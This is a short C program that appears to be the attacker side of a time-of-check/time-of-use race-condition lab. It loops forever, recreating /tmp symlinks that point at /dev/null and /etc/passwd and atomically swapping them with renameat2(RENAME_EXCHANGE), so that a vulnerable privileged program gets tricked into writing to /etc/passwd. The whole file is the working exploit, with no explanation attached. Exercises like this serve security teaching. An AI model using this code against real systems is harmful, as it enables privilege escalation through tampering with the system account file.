#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
int main()
{
	unsigned int flags = RENAME_EXCHANGE;
	int i = 0;
	while (1) {
		printf("attempt %d\n", i);
		i++;
		remove("/tmp/XYZ");
		fopen("/tmp/XYZ", "a");
		unlink("/tmp/XYZ"); 
		symlink("/dev/null", "/tmp/XYZ");
		unlink("/tmp/ABC"); 
		symlink("/etc/passwd", "/tmp/ABC");
		//sleep(2);
		renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
	}
	return 0;
}
